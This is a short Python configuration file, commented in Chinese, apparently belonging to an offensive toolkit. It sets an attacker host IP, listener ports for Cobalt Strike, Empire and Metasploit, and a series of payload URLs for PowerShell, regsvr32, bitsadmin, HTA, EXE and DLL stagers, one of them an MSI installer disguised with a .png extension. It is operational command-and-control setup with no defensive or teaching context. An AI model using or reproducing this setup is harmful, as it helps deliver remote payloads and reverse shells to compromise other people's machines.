# encoding:utf8
# 配置文件，方便直接调用已准备好的远程代码
# 
#

lhost = "118.24.63.73"

port_cobalt = 442
port_empire = 8888
port_msf    = 4444

cobalt_powershell = "http://{0}:65530/a".format(lhost)
cobalt_regsvr32   = "http://{0}:65531/a".format(lhost)
cobalt_bitsadmin  = "http://{0}:65532/a".format(lhost)
cobalt_python     = "http://{0}:65533/a".format(lhost)
cobalt_hta        = "http://{0}/evil/cobalt.hta".format(lhost)
cobalt_exe        = "http://{0}/evil/cobalt.exe".format(lhost)
cobalt_dll        = "http://{0}/evil/c32.dll".format(lhost)

# meterpreter/reverse_tcp 
msf_hta           = "http://{0}/evil/msf.hta".format(lhost)
msf_msi           = "http://{0}/evil/msi.png".format(lhost)

empire_hta        = "http://{0}/evil/empire.hta".format(lhost)


